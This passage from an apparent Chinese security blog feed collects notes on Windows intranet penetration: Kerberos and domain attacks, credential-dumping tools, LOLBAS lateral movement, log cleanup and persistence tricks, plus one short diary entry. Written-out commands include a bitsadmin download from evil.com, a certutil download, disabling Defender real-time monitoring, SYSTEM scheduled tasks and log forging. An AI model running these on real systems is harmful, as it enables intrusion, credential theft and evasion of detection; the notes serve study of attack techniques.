title="常用概念"></a>常用概念</h2><p>组策略容器 (Group Policy Container，GPC)存储在活动目录中，包含GPO属性、配置信息和版本等。可以通过GPC来查找GPT。</p><p>组策略模板 (Group Policy Template, GPT) 存储在域控中，包含所有的组策略信息。包括管理模板，安全，脚本，软件安装等。</p><p>其中GPC中的信息量少、容量小，GPT中消息量较大、容量大，因此两个部分分开存放。防止活动目录中因存储了过多的数据而被影响性能。</p><p>组策略对象 (Group Policy Object, GPO) 是包含多种Windows组策略设置的集合，存储在GPC和GPT中。</p><h1 id="Kerberos的Windows实现"><a href="#Kerberos的Windows实现" class="headerlink" title="Kerberos的Windows实现"></a>Kerberos的Windows实现</h1><h2 id="相关定义"><a href="#相关定义" class="headerlink" title="相关定义"></a>相关定义</h2><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>服务主体名称 (ServicePrincipal Names, SPN) ，是服务实例(如HTTP、SMB等)的唯一标识符。</p><p>SPN分为两种类型：一种是注册在活动目录的机器帐户下，当一个服务的权限为 Local System 或 Network Service，则SPN注册在机器帐户下。一种是注册在活动目录的域用户帐户下，当一个服务的权限为一个域用户，则SPN注册在域用户帐户下。</p><h1 id="域内攻击思路"><a href="#域内攻击思路" class="headerlink" title="域内攻击思路"></a>域内攻击思路</h1><ul><li><p>获取域控权限<br>通过域控相关漏洞<br>抓hash，尤其是域管理员、运维等高权限账号的哈希</p></li><li><p>控制入域机器<br>下发恶意策略控制<br>获取域内用户凭证<br>利用错误的域管理配置<br>域内relay</p></li><li><p>获取服务票据<br>攻击Exchange等服务器</p></li></ul><h1 id="攻击类型"><a href="#攻击类型" class="headerlink" title="攻击类型"></a>攻击类型</h1><h2 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h2><p>在认证过程中，经过client与AS的通信会得到TGT，黄金票据（Golden Ticket）就是伪造票据授予票据（TGT），也被称为认证票据。</p><p>黄金票据利用需要与DC通信，且需要获取krbtgt的hash，但是可以获取任何Kerbose服务权限。</p><h2 id="白银票据利用"><a href="#白银票据利用" class="headerlink" title="白银票据利用"></a>白银票据利用</h2><p>白银票据（Silver Tickets）伪造利用的是Kerberos认证中的第三个步骤，在第三步的时候，client会带着ticket向server的某个服务进行请求，如果验证通过就可以访问server上的指定服务了，这里的ticket是基于client info、server session key、end time、server hash。这里client info已知，end time可以构造，server session key是TGS生成的，所以只要server的NTLM hash即可。银票伪造的是TGS，只能访问指定的服务。</p><h2 id="DCSync攻击"><a href="#DCSync攻击" class="headerlink" title="DCSync攻击"></a>DCSync攻击</h2><p>域内有多台域控服务器时，为了同步域控服务器的修改，微软提供了基于远程目录协议 DRSR 的同步机制。</p><p>在多个域控服务器之间，每隔一段时间会有一次域数据的同步。由需要同步的域控服务器向其它服务器发送 GetNCChanges 请求，请求中包含需要同步的数据。数据量较多时，则重复这个过程。</p><p>DCSync 就是使用这种机制进行域渗透的技术，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，在2015年添加到 mimikatz 的一个功能，可以导出域内所有用户的hash。</p><p>这种方式需要满足以下任一一种权限：</p><p>Administrators 组内的用户<br>Domain Admins 组内的用户<br>Enterprise Admins 组内的用户<br>域控制器的计算机帐户<br>或者拥有特定的几条 DACL:</p><p>DS-Replication-Get-Changes<br>DS-Replication-Get-Changes-All<br>DS-Replication-Get-Changes-In-Filtered-Set<br>当没有管理员用户，但是拥有 WriteDACL 权限时，可以写入上述 DACL 来完成 DCSync 。</p><p>对于这种攻击，可以通过检测 GetNCChanges 发起者的方式，如果由非域控机器发起对应请求，则可以认为是 DCSync 攻击。</p><h2 id="DCShadow攻击"><a href="#DCShadow攻击" class="headerlink" title="DCShadow攻击"></a>DCShadow攻击</h2><p>DCShadow是由来自法国的安全研究人员Benjamin Delpy和Vincent Le Toux在2018年的微软蓝帽（Blue Hat）大会上提出。</p><p>DCShadow攻击指在Active Directory环境下创建一个恶意的域控制器，并用它来推送恶意对象。</p><h2 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h2><p>哈希传递攻击（Pass-the-Hash，PTH）是通过传递NTLM哈希来认证的攻击方法，常用的工具有mimikatz等。</p><h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><p>票据传递攻击（Pass-the-Ticket Attacks，PtT）是一种使用Kerberos票据代替明文密码或NTLM哈希的方法。PtT最常见的用途可能是使用黄金票据和白银票据，通过PtT访问主机相当简单。</p><h2 id="Kerberoasting-Attacks"><a href="#Kerberoasting-Attacks" class="headerlink" title="Kerberoasting Attacks"></a>Kerberoasting Attacks</h2><p>Kerberoasting攻击由Tim Medin在2014 DerbyCon conference上 公开 。指域内的任何一台主机，都可以通过查询SPN，Kerberoasting即是向域内的所有服务请求TGS，然后进行暴力破解。</p><h3 id="Roasting-AS-REP"><a href="#Roasting-AS-REP" class="headerlink" title="Roasting AS-REP"></a>Roasting AS-REP</h3><p>该攻击枚举域中不需要Kerberos预身份认证的帐户，向这些账户请求一条加密信息，并离线尝试获取到的账户哈希。该方式需要账户明确设置了 <code>DONT_REQ_PREAUTH</code> 。</p><h2 id="Kerberos-Delegation-Attacks"><a href="#Kerberos-Delegation-Attacks" class="headerlink" title="Kerberos Delegation Attacks"></a>Kerberos Delegation Attacks</h2><p>在一个域中，A使用Kerberos身份验证访问服务B，B再使用A的身份去访问C，这个过程就可以理解为委派。委派主要分为非约束委派（Unconstrained delegation）和约束委派（Constrained delegation）两种，非约束委派可以访问域内任意其它服务，约束委派对认证做了限制不可以访问其他的服务。</p><p>Kerberos Delegation（Kerberos委派）攻击分为非约束委派攻击和约束委派攻击。原理都是基于域内已经配置了委派的账户来获取其它账户的权限。</p><h2 id="其他漏洞利用"><a href="#其他漏洞利用" class="headerlink" title="其他漏洞利用"></a>其他漏洞利用</h2><p>域用户提权 (CVE-2022-26923)<br>KDC bamboozling (CVE-2021-42287)<br>Name impersonation (CVE-2021-42278)<br>ProxyShell (CVE-2021-34473)<br>ProxyLogon (CVE-2021-26855)<br>PrintNightmare (CVE-2021-1675 &#x2F; CVE-2021-34527)<br>SMBGhost (CVE-2020-0796)<br>Zerologon (CVE-2020-1472)<br>NTLM Relay (CVE-2019-1040)<br>永恒之蓝 (MS17-010)<br>域用户提权 (MS14-068)<br>Gpp漏洞 (MS14-025)<br>SAMR协议漏洞 (MS14-016)</p><h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><ul><li>使用ATA等商业化防护工具</li><li>安装杀毒软件、EDR等工具</li><li>关闭高危服务</li><li>统一配置防火墙策略</li><li>对域控等高危账号使用白名单进行行为管理</li><li>检测高危操作<br>权限提升<br>高危账号密码修改、重置</li><li>行为频率建模<br>对大量尝试登录&#x2F;信息查询进行报警</li><li>及时安装补丁</li><li>对特定攻击行为进行监控<br>通过GPO下发自启动、计划任务</li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="域渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Windows内网渗透之权限</title>
    <link href="http://example.com/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90/"/>
    <id>http://example.com/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90/</id>
    <published>2023-08-23T16:00:00.000Z</published>
    <updated>2023-08-25T07:50:21.954Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>获取权限，才能从外围进入核心。</p><span id="more"></span><h1 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>UAC(User Account Control)是Windows Vista和Windows Server 2008引入的一个安全机制，当一些敏感操作发生时，会跳出提示显示要求系统权限。</p><p>当用户登录Windows时，每个用户都会被授予一个access token，这个token中有security identifier(SID)的信息，决定了用户的权限。</p><h2 id="会触发UAC的操作"><a href="#会触发UAC的操作" class="headerlink" title="会触发UAC的操作"></a>会触发UAC的操作</h2><ul><li>以管理员权限启动应用</li><li>修改系统、UAC设置</li><li>修改没有权限的文件或目录（%SystemRoot% &#x2F; %ProgramFiles% 等）</li><li>修改ACL(access control list)</li><li>安装驱动</li><li>增删账户，修改账户类型，激活来宾用户</li></ul><h2 id="ByPass"><a href="#ByPass" class="headerlink" title="ByPass"></a>ByPass</h2><ul><li>DLL相关</li><li>进程注入</li><li>注册表</li></ul><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>权限提升有多种方式，有利用二进制漏洞、逻辑漏洞等技巧。利用二进制漏洞获取权限的方式是利用运行在内核态中的漏洞来执行代码。比如内核、驱动中的UAF或是其他类似的漏洞，以获得较高权限。</p><p>逻辑漏洞主要是利用系统的一些逻辑存在问题的机制，比如有些文件夹用户可以写入，但是会以管理员权限启动。</p><h2 id="任意写文件利用"><a href="#任意写文件利用" class="headerlink" title="任意写文件利用"></a>任意写文件利用</h2><p>在Windows中用户可以写的敏感位置主要有以下这些：</p><ul><li>用户自身的文件和目录，包括<code>AppData</code> <code>Temp</code></li><li><code>C:\</code> , 默认情况下用户可以写入</li><li><code>C:\ProgramData</code> 的子目录，默认情况下用户可以创建文件夹、写入文件</li><li><code>C:\Windows\Temp</code> 的子目录，默认情况下用户可以创建文件夹、写入文件</li></ul><p>具体的ACL信息可用AccessChk，或Powershell的 <code>Get-Acl</code> 命令查看。</p><p>可以利用对这些文件夹及其子目录的写权限，写入一些可能会被加载的dll，利用dll的加载执行来获取权限。</p><h2 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h2><p>MOF(Managed Object Format)是Windows系统的一个文件 <code>c:/windows/system32/wbem/mof/nullvert.mof</code><br>叫做“托管对象格式”，其作用是每隔5秒就会去监控进行创建和死亡。</p><p>当拥有文件上传的权限但是没有shell时，可以上传定制的mof文件至相应的位置，一定时间后这个mof就会被执行。</p><p>一般会采用在mof中加入一段添加管理员用户的命令的vbs脚本，当执行后就拥有了新的管理员账户。</p><h2 id="凭证窃取"><a href="#凭证窃取" class="headerlink" title="凭证窃取"></a>凭证窃取</h2><ul><li><p>Windows本地密码散列导出工具<br>mimikatz<br>lsass<br>wce<br>gsecdump<br>copypwd<br>Pwdump<br><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procdump">ProcDump</a></p></li><li><p>Windows本地密码破解工具<br>L0phtCrack<br>SAMInside<br>Ophcrack<br>彩虹表破解（<a href="https://www.zhihu.com/question/19790488">彩虹表</a>）<br>本机hash+明文抓取<br>win8+win2012明文抓取<br>ntds.dit的导出+QuarkPwDump读取分析<br>vssown.vbs+libesedb+NtdsXtract<br>ntdsdump<br>利用powershell(DSInternals)分析hash<br>使用 <code>net use \\%computername% /u:%username%</code> 重置密码尝试次数<br>限制读取时，可crash操作系统后，在蓝屏的dump文件中读取</p></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>组策略首选漏洞<br>DLL劫持<br>替换系统工具，实现后门<br>关闭defender <code>Set-MpPreference -disablerealtimeMonitoring $true</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;获取权限，才能从外围进入核心。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="权限" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Windows内网渗透之横向移动</title>
    <link href="http://example.com/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>http://example.com/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2023-08-23T16:00:00.000Z</published>
    <updated>2023-08-25T07:50:10.090Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>获取权限后，横向移动以取得更多成果。</p><span id="more"></span><h1 id="常见入口"><a href="#常见入口" class="headerlink" title="常见入口"></a>常见入口</h1><ul><li>SMB弱密码</li><li>SqlServer弱密码</li></ul><h1 id="LOLBAS"><a href="#LOLBAS" class="headerlink" title="LOLBAS"></a>LOLBAS</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，是一种白利用方式，是在2013年DerbyCon由Christopher Campbell和Matt Graeber发现，最终Philip Goh提出的概念。</p><p>这些程序一般有有Microsoft或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于内网渗透中。这些程序可能会被用于：下载安全恶意程序、执行恶意代码、绕过UAC、绕过程序控制等。</p><h2 id="常见程序"><a href="#常见程序" class="headerlink" title="常见程序"></a>常见程序</h2><ul><li><p>appsyncvpublishing.exe<br>执行powershell</p></li><li><p>bitsadmin.exe<br>下载文件 <code>bitsadmin /transfer &lt;job_name&gt; /priority &lt;remote_path&gt; &lt;local_path&gt;</code><br>下载文件 <code>bitsadmin /create 1 bitsadmin /addfile 1 https://evil.com/autoruns.exe c:\data\playfolder\autoruns</code><br>复制文件 <code>bitsadmin /create 1 &amp; bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfoler\cmd.exe</code><br>代码执行 <code>bitsadmin /create 1 &amp; bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe</code></p></li><li><p>cdb.exe</p></li><li><p>certutil.exe<br>可安装、备份、删除、管理和执行证书<br>证书存储相关功能<br>下载文件 <code>certuil -urlcache -split -f https://addr/example.exe</code><br>注意certutil是有cache的，需要显式删除<br>base64编解码 <code>certutil -encode</code> &#x2F; <code>certutil -decode</code></p></li><li><p>cmd.exe</p></li><li><p>cmstp.exe</p></li><li><p>control.exe<br>加载dll</p></li><li><p>csc.exe<br>编译C#载荷</p></li><li><p>cscript.exe<br>执行脚本</p></li><li><p>extexport.exe</p></li><li><p>expand.exe<br>展开一个或多个压缩文件</p></li><li><p>forfiles.exe<br><code>forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe</code></p></li><li><p>mofcomp.exe</p></li><li><p>makecab.exe</p></li><li><p>msbuild.exe<br>构建应用程序</p></li><li><p>mshta.exe<br>HTML应用</p></li><li><p>msxsl.exe<br>处理加载XSL程序</p></li><li><p>netsh.exe</p></li><li><p>installutil.exe<br>安装&#x2F;卸载程序组件</p></li><li><p>IEExec.exe<br>.NET Framework附带程序</p></li><li><p>powershell.exe</p></li><li><p>psexec.exe<br><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/psexec">PsExec</a></p></li><li><p>reg.exe<br>注册表控制台</p></li><li><p>regedit.exe<br>注册表修改</p></li><li><p>regsvr32.exe<br>注册动态链接库&#x2F;ActiveX控件</p></li><li><p>rundll32.exe<br>执行DLL文件中的内部函数</p></li><li><p>sc.exe<br>查看服务状态管理</p></li><li><p>schtasks.exe<br>定时计划任务</p></li><li><p>shred<br>重复写入文件，防止文件恢复</p></li><li><p>type.exe<br>利用ads隐藏文件 <code>type &lt;filepath&gt; &lt;target_file:ads&gt;</code></p></li><li><p>wmic.exe<br>Windows管理工具</p></li><li><p>windbg.exe</p></li><li><p>winrm.exe</p></li><li><p>wscript.exe<br>脚本引擎</p></li><li><p>waitfor.exe<br>用于同步网络中计算机，可以发送或等待系统上的信号。</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;获取权限后，横向移动以取得更多成果。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="横向移动" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Windows内网渗透之痕迹清理</title>
    <link href="http://example.com/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/"/>
    <id>http://example.com/2023/08/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/</id>
    <published>2023-08-23T16:00:00.000Z</published>
    <updated>2023-08-25T07:50:15.023Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>渗透完毕后，需要对痕迹进行清理，以免被马上发现或轻松溯源。</p><span id="more"></span><h1 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h1><p>查看日志 <code>eventvwr</code><br>伪造日志 <code>eventcreate</code><br><strong>操作日志</strong></p><ul><li>3389登录列表</li><li>文件打开日志</li><li>文件修改日志</li><li>浏览器日志</li><li>系统事件</li><li>程序安装记录</li><li>程序删除记录</li><li>程序更新记录</li></ul><p><strong>登录日志</strong></p><ul><li>系统安全日志</li></ul><p><strong>日志路径</strong></p><ul><li>系统日志 <code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></li><li>安全日志 <code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></li><li>应用程序日志 <code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></li></ul><p><strong>服务日志</strong></p><ul><li>IIS <code>%SystemDrive%\inetpub\logs\LogFiles\W3SVC1\</code></li></ul><h1 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h1><ul><li>AppCompatFlags</li><li>Background Activity Moderator(BAM)</li><li>MuiCache</li><li>RecentApps</li><li>RunMRU</li><li>ShimCache(AppCompatCache)</li></ul><h2 id="注册表键"><a href="#注册表键" class="headerlink" title="注册表键"></a>注册表键</h2><ul><li>HKEY_LOCAL_MACHINEsystemCurrentControlSetServicesEventlog</li></ul><h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><h2 id="Prefetch"><a href="#Prefetch" class="headerlink" title="Prefetch"></a>Prefetch</h2><p>预读取文件夹，用来存放系统已访问过的文件的预读信息，扩展名为PF。位置在 <code>C:\Windows\Prefetch</code></p><h2 id="JumpLists"><a href="#JumpLists" class="headerlink" title="JumpLists"></a>JumpLists</h2><p>记录用户最近使用的文档和应用程序，方便用户快速跳转到指定文件，位置在 <code>%AppData%\Microsoft\Windows\Recent</code></p><h2 id="Amcache-x2F-RecentFileCache-bcf"><a href="#Amcache-x2F-RecentFileCache-bcf" class="headerlink" title="Amcache&#x2F;RecentFileCache.bcf"></a>Amcache&#x2F;RecentFileCache.bcf</h2><p>Windows中的使用这两个文件来跟踪具有不同可执行文件的应用程序兼容性问题，它可用于确定可执行文件首次运行的事件和最后修改时间。</p><p>在Windows7、Windows Server 2008 R2等系统中，文件保存在 <code>C:\Windows\AppCompat\Programs\RecentFileCache.bcf</code> ，包含程序的创建时间、上次修改时间、上次访问时间和文件名。</p><p>在Windows8、Windows10、Windows Server 2012等系统中，文件保存在 <code>C:\Windows\AppCompat\Programs\Amcache.hve</code> ，包含文件大小、版本、sha1、二进制文件类型等信息。</p><h1 id="时间轴"><a href="#时间轴" class="headerlink" title="时间轴"></a>时间轴</h1><p>Windows时间轴是Windows 10在1803版中引入的一个新特性，会记录访问过的网站、编辑过的文档、运行的程序等。</p><h1 id="彻底删除"><a href="#彻底删除" class="headerlink" title="彻底删除"></a>彻底删除</h1><ul><li>多次覆写文件 <code>cipher /w:&lt;path&gt;</code></li><li>格式化某磁盘count次 <code>format D: /p:&lt;count&gt;</code></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;渗透完毕后，需要对痕迹进行清理，以免被马上发现或轻松溯源。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="痕迹清理" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>一下子</title>
    <link href="http://example.com/2023/08/22/Diary_20230822/"/>
    <id>http://example.com/2023/08/22/Diary_20230822/</id>
    <published>2023-08-21T16:00:00.000Z</published>
    <updated>2023-08-22T16:26:18.231Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一下子就没写日记了。</p><span id="more"></span><h1 id="一瞬间"><a href="#一瞬间" class="headerlink" title="一瞬间"></a>一瞬间</h1><p>突然有了好几天没写日记，而我今天也不想写，反而只是在浪费时间。<br>感觉，就像弦突然断掉了一样。</p><p>但无论如何，还得坚持下去，有时虽然只是在说些无意义的话。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一下子就没写日记了。&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>Windows内网渗透之持久化</title>
    <link href="http://example.com/2023/08/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8C%81%E4%B9%85%E5%8C%96/"/>
    <id>http://example.com/2023/08/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8C%81%E4%B9%85%E5%8C%96/</id>
    <published>2023-08-21T16:00:00.000Z</published>
    <updated>2023-08-25T07:50:26.784Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>进入内网后，要想办法保持权限。</p><span id="more"></span><h1 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h1><h2 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h2><p>创建系统隐藏文件：<br><code>attrib +s +a +r +h filename</code> &#x2F; <code>attrib +s +h filename</code><br>利用NTFS ADS(Alternate Data Streams)创建隐藏文件<br><strong>利用Windows保留字</strong>：<br><code>aux|prn|con|nul|com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9</code></p><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><h3 id="sethc"><a href="#sethc" class="headerlink" title="sethc"></a>sethc</h3><p><code>sethc.exe</code> 是Windows系统在用户按下五次shift后调用的粘滞键处理程序，当有写文件但是没有执行权限时，可以通过替换 <code>sethc.exe</code> 的方式留下后门，在密码输入页面输入五次shift即可获得权限。</p><h3 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h3><p>在高版本的Windows中，替换程序是受到系统保护的，需要使用其他的技巧来实现替换。</p><p>具体操作为在注册表的<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft NT\CurrentVersion\Image File Execution Option</code> 下添加项 <code>sethc.exe</code> ，然后在 <code>sethc.exe</code> 这个项中添加 <code>debugger</code> 键，键值为恶意程序的路径。</p><h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p>Windows下有 <code>schtasks</code> 和 <code>at</code> 两种计划任务机制。其中 <code>at</code> 在较高版本的Windows中已经弃用。</p><p>设置命令为 <code>schtasks /create /tn &quot;TEST_OnLogon&quot; /sc onlogon /tr &quot;cmd.exe /c calc.exe&quot;</code> , <code>schtasks /create /tn &quot;TEST_OnStartup&quot; /ru system /tr &quot;cmd.exe /c calc.exe&quot;</code><br>删除命令为：<br><code>schtasks /delete /tn &quot;TEST_OnLogon&quot; /f</code></p><h3 id="登录脚本"><a href="#登录脚本" class="headerlink" title="登录脚本"></a>登录脚本</h3><p>Windows可以在用户登录前执行脚本，使用<br><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> 设置。<br>也可在 <code>HKCU\Environment\</code> 路径下设置 <code>UserInitMprLogonScript</code> 来实现。</p><h3 id="屏幕保护程序"><a href="#屏幕保护程序" class="headerlink" title="屏幕保护程序"></a>屏幕保护程序</h3><p>Windows可以自定义屏幕保护程序，使用 <code>HKEY_CURRENT_USER\Control Panel\Desktop</code> 设置。</p><h3 id="隐藏用户"><a href="#隐藏用户" class="headerlink" title="隐藏用户"></a>隐藏用户</h3><p>Windows可以使用在用户名后加入 <code>$</code> 来创建隐藏用户，这种账户可在一定条件下隐藏，但是仍可以通过控制面板查看。<br>在创建隐藏用户的基础上，可以修改注册表的方式创建影子用户，这种创建方式创建的用户只能通过注册表查看。</p><h3 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h3><p>CLR(Common Language Runtime Compilation)公共语言运行时，是微软.NET产品构建的运行环境，可以粗略地理解为.NET虚拟机。<br>.NET程序的运行离不开CLR，因此可以通过劫持CLR的方式实现后门。</p><h3 id="Winlogon-Helper-DLL后门"><a href="#Winlogon-Helper-DLL后门" class="headerlink" title="Winlogon Helper DLL后门"></a>Winlogon Helper DLL后门</h3><p>Winlogon是一个Windows组件，用来处理各种活动，如登录、注销、身份验证期间加载用户配置文件、关闭、锁定屏幕等。这种行为由注册表管理，该注册定义在Windows登录期间启动哪些进程。所以可以依靠这个注册表进行权限维持。<br>注册表位置如下：<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> 用于执行exe程序<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> 用于执行exe程序<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify</code> 用于执行dll文件</p><h2 id="自启动"><a href="#自启动" class="headerlink" title="自启动"></a>自启动</h2><h3 id="基于注册表的自启动"><a href="#基于注册表的自启动" class="headerlink" title="基于注册表的自启动"></a>基于注册表的自启动</h3><p>通过在注册表中写入相应的键值可以实现程序的开机自启动，主要是 <code>Run</code> 和 <code>RunOnce</code> , 其中RunOnce和Run区别在于RunOnce的键值只作用一次，执行完毕后会自动删除。</p><p>注册表如下：<br><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code><br><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code><br><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code><br><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code><br><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code></p><p>基于策略的自启动注册表设置如下：<br><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code><br><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code></p><p>设置启动文件夹注册表位置如下：<br><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code><br><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell 